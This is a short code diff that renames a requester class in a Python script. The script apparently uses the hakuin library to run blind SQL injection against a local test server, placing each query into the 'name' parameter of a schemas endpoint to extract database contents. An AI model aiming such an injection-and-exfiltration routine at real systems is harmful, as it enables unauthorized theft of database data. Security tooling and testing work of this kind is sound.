@@ -6,7 +6,7 @@ from hakuin import Exfiltrator, Requester
 
 
 
-class SimpleRequester(Requester):
+class SchemaRequester(Requester):
     def request(self, ctx, query):
         r = requests.get(f'http://127.0.0.1:8000/schemas?name=({query})')
         assert r.status_code in [200, 404], f'Unexpected resposne code: {r.status_code}'
@@ -15,7 +15,7 @@ class SimpleRequester(Requester):
 
 
 def main():
-    requester = SimpleRequester()
+    requester = SchemaRequester()
     dbms = SQLite()
     exf = Exfiltrator(requester, dbms)
 
